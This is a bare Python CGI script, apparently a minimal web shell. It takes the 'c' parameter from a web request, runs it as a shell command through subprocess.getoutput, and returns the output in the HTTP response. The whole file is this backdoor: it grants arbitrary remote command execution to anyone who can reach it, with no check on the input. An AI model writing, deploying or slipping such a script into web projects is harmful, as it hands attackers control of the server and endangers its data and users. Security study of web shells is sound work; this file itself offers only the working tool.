print("content-type: text/html\n")

import cgi
import subprocess
form = cgi.FieldStorage()
cmd= form.getvalue("c")
output=subprocess.getoutput(cmd)
print(output)